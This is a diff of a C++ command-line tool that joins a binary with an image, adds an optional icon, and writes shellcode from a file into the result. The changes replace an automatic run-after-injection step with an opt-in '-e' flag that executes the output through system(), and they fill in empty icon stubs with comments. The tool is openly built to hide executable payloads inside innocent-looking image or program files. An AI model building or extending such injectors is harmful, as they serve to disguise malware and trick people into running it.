@@ -3,7 +3,11 @@
 #include <vector>
 #include <string>
 #include <cstdint>
-#include <cstdlib> 
+#include <cstdlib>
+
+#ifdef _WIN32
+#include <windows.h>
+#endif
 
 const std::string version = "0.0.0.2";
 
@@ -21,15 +25,15 @@ void displayHelp() {
                                                                  |  $$$$$$/                                                  
                                                                   \______/                                                   
 )" << std::endl;
-    std::cout << "Use: program -o <output_file> [-b <binary>] [-i <image>] [-c <icon>] [-r] [-n] [-x] -s <shellcode>" << std::endl;
+    std::cout << "Use: program -o <output_file> [-b <binary>] [-i <image>] [-c <icon>] [-r] [-x] -s <shellcode> [-e]" << std::endl;
     std::cout << "  -o <output_file>   Specifies the name of the output file." << std::endl;
     std::cout << "  -b <binary>        Specifies a binary file to be concatenated." << std::endl;
     std::cout << "  -i <image>         Specifies an image to be concatenated." << std::endl;
     std::cout << "  -c <icon>          Specifies a .ico icon file to be added to the executable." << std::endl;
     std::cout << "  -s <shellcode>     Specifies the file containing the shellcode to be injected." << std::endl;
     std::cout << "  -r                 Restores the image to its original state after injection." << std::endl;
-    std::cout << "  -n                 Does not run the executable after injection." << std::endl;
     std::cout << "  -x                 Skips shellcode injection." << std::endl;
+    std::cout << "  -e                 Executes the file after concatenation." << std::endl;
     std::cout << "  -h                 Displays help message." << std::endl;
     std::cout << "  -v                 Displays version information." << std::endl;
 }
@@ -72,10 +76,10 @@ bool isIcon(const std::string& filename) {
     return filename.size() > 4 && filename.substr(filename.size() - 4) == ".ico";
 }
 
-void injectShellcode(const std::string& imageFile, const std::string& shellcodeFile, bool restoreImage, bool runExecutable) {
+void injectShellcode(const std::string& imageFile, const std::string& shellcodeFile, bool restoreImage) {
     std::ifstream shellcodeInput(shellcodeFile, std::ios::binary | std::ios::ate);
     if (!shellcodeInput) {
-        std::cerr << "Error opening shellcode file:  " << shellcodeFile << std::endl;
+        std::cerr << "Error opening shellcode file: " << shellcodeFile << std::endl;
         return;
     }
 
@@ -120,7 +124,7 @@ void injectShellcode(const std::string& imageFile, const std::string& shellcodeF
     }
 
     // Inject the shellcode into the image buffer
-    std::copy(shellcodeBuffer.begin(), shellcodeBuffer.end(), imageBuffer.begin () + injectionPoint);
+    std::copy(shellcodeBuffer.begin(), shellcodeBuffer.end(), imageBuffer.begin() + injectionPoint);
 
     // Write the modified buffer back to the image file
     std::ofstream imageOutput(imageFile, std::ios::binary);
@@ -130,16 +134,6 @@ void injectShellcode(const std::string& imageFile, const std::string& shellcodeF
     }
 
     std::cout << "Shellcode successfully injected into the image." << std::endl;
-
-    if (runExecutable) {
-        std::string command = "./" + imageFile; 
-        int result = system(command.c_str()); 
-
-        if (result != 0) {
-            std::cerr << "Error running the injected executable." << std::endl;
-            return;
-        }
-    }
 
     if (restoreImage) {
         // Restore the original image
@@ -154,26 +148,38 @@ void injectShellcode(const std::string& imageFile, const std::string& shellcodeF
 }
 
 #ifdef _WIN32
-#include <windows.h>
-
 void addIconToExecutable(const std::string& executable, const std::string& icon) {
-    
+    // Implementation for adding icon on Windows
 }
 #endif
 
 #ifdef __linux__
-
 void addIconToExecutable(const std::string& executable, const std::string& icon) {
-    
+    // Implementation for adding icon on Linux
 }
 #endif
 
 #ifdef __APPLE__
-
 void addIconToExecutable(const std::string& executable, const std::string& icon) {
-    
+    // Implementation for adding icon on macOS
 }
 #endif
+
+void executeFile(const std::string& filename) {
+    std::string command;
+
+#ifdef _WIN32
+    command = filename; // No need for "./" prefix on Windows
+#else
+    command = "./" + filename; // Unix-based systems
+#endif
+
+    int result = system(command.c_str());
+
+    if (result != 0) {
+        std::cerr << "Error running the executable." << std::endl;
+    }
+}
 
 int main(int argc, char* argv[]) {
     if (argc < 2) {
@@ -187,7 +193,7 @@ int main(int argc, char* argv[]) {
     std::string shellcodeFile;
     std::string iconFile;
     bool restoreImage = false;
-    bool runExecutable = true;
+    bool runExecutable = false;
     bool injectShellcodeFlag = true;
 
     for (int i = 1; i < argc; i += 2) {
@@ -218,10 +224,10 @@ int main(int argc, char* argv[]) {
             iconFile = filename;
         } else if (option == "-r") {
             restoreImage = true;
-        } else if (option == "-n") {
-            runExecutable = false;
         } else if (option == "-x") {
             injectShellcodeFlag = false;
+        } else if (option == "-e") {
+            runExecutable = true;
         } else {
             std::cerr << "Invalid Option: " << option << std::endl;
             return 1;
@@ -257,7 +263,7 @@ int main(int argc, char* argv[]) {
 
     if (injectShellcodeFlag) {
         // Inject the shellcode into the image
-        injectShellcode(outputFile, shellcodeFile, restoreImage, runExecutable);
+        injectShellcode(outputFile, shellcodeFile, restoreImage);
     }
 
     // Add icon to the executable
@@ -268,6 +274,10 @@ int main(int argc, char* argv[]) {
             std::cerr << "The file " << iconFile << " is not a valid .ico file." << std::endl;
             return 1;
         }
+    }
+
+    if (runExecutable) {
+        executeFile(outputFile);
     }
 
     return 0;
